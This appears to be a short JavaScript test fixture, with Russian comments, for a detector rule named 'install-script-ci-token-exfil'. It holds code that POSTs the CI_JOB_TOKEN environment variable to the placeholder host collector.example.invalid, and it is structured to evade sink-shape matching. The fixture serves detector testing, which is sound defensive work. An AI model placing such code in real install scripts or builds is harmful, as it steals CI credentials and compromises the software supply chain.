// Обход по форме стока: объект запроса сохранён в переменную, тело пишется в него
// отдельным вызовом. В опциях запроса секрета нет.
// Ожидается ERROR install-script-ci-token-exfil.
const https = require('https');
const req = https.request({ hostname: 'collector.example.invalid', path: '/c', method: 'POST' });

req.write(process.env.CI_JOB_TOKEN);
